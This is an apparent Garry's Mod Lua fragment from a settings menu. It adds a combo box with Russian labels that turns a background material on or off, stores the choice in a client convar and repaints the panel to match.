--local convarmatfon = CreateClientConVar( "s.loader.matloader", 0, true, false )
local textmatpole = ui.Create( "DTextEntry", panelsetting ) -- поле
local textmatpoleconvar = CreateClientConVar( "s.loader.mattextconvar", "models/props_lab/cornerunit_cloud", true, false ) --convar pole
local backgroundfon = ui.Create( "DComboBox", panelsetting )
backgroundfon:SetPos( 220, 130 )
backgroundfon:SetSize( 235, 20 )
backgroundfon:SetColor( getcolormixer(3, 200) )
backgroundfon:SetFont(getfontfe(3))
backgroundfon:SetValue( "Задний фон: Выкл." )
backgroundfon:AddChoice( "Задний фон: Выкл." )
backgroundfon:AddChoice( "Задний фон: Вкл." )


local function backgrounddon()
if textmatpoleconvar:GetString() == "" then mattest:SetVisible( false ) else
mattest:SetVisible( true )
mattest:SetMaterial(textmatpoleconvar:GetString())
--print(textmatpoleconvar:GetString())
end
backgroundstatusfon = true
backgroundfon:SetValue( "Задний фон: Вкл." )
backgroundfon:SetColor( getcolormixer(4, 200) )
backgroundfon.Paint = function( self, w, h)
draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(2, 180), false, false, false, false )
end
end

local function backgrounddoff()
mattest:SetVisible( false )
mattest:SetMaterial("Models/effects/comball_sphere")
backgroundstatusfon = false
backgroundfon:SetValue( "Задний фон: Выкл." )
backgroundfon:SetColor( getcolormixer(3, 200) )
backgroundfon.Paint = function( self, w, h)
draw.RoundedBoxEx( 15, 0, 0, w, h, getcolormixer(1, 105), false, false, false, false )
end
end



backgroundfon.OnSelect = function( self, index, value )
RunConsoleCommand("s.loader.matloader", index)

if index == 1 then
backgrounddoff()
elseif index == 2 then
backgrounddon()
end


end



if convarmatfon:GetInt() == 2 then
backgrounddon()
else
backgrounddoff()
end




